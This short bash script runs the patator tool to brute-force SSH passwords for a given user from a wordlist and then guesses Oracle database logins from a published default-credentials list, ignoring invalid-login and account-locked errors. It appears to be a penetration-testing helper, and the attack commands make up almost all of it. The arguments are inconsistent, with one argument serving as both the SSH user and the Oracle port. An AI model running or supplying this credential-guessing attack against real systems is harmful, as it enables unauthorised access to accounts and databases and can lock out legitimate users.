#!/bin/bash

if [ $# -eq 3 ]; then
	patator ssh_login host=$1 user=$2 password=FILE0 0=$3
	patator oracle_login host=$1 port=$2 user=COMBO00 password=COMBO01 0=/usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt -x ignore:code=ORA-01017 -x ignore:code=ORA-28000

else
    echo "Please provide a target host and a port."
fi
